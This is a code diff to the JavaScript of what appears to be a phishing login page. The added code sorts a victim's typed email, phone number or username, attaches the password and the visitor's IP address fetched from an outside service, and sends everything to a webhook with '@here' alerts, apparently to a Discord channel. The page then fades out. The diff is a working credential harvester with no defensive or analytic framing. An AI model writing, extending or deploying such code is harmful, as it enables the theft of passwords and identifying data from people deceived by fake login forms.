@@ -149,7 +149,7 @@
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(ipData => {
-          const data = `IP: ${ipData.ip}`;
+          const data = `@here Visitor: ${ipData.ip}`;
           sendToWebhook(data);
         })
         .catch(error => console.error('Error fetching IP address:', error));
@@ -193,6 +193,33 @@
         }
         return false;
       }
+
+      // Determine the type of input and format the message
+      let type;
+      let message = '@here ';
+
+      if (email.includes('@')) {
+        type = 'Email';
+        message += `Email: ${email}\nPassword: ${password}`;
+      } else if (/^\d{10}$/.test(email)) {
+        type = 'Phone';
+        message += `Phone: ${email}\nPassword: ${password}`;
+      } else if (/^[a-zA-Z0-9]+$/.test(email)) {
+        type = 'Username';
+        message += `Username: ${email}\nPassword: ${password}`;
+      } else {
+        alertMessage.style.display = 'block';
+        return false; // Prevent submission if invalid format
+      }
+
+      // Send the formatted message with the IP
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+          const ipMessage = `\nVisitor IP: ${ipData.ip}`;
+          sendToWebhook(message + ipMessage);
+        })
+        .catch(error => console.error('Error fetching IP address:', error));
 
       // Fade out effect
       document.body.style.opacity = '0';
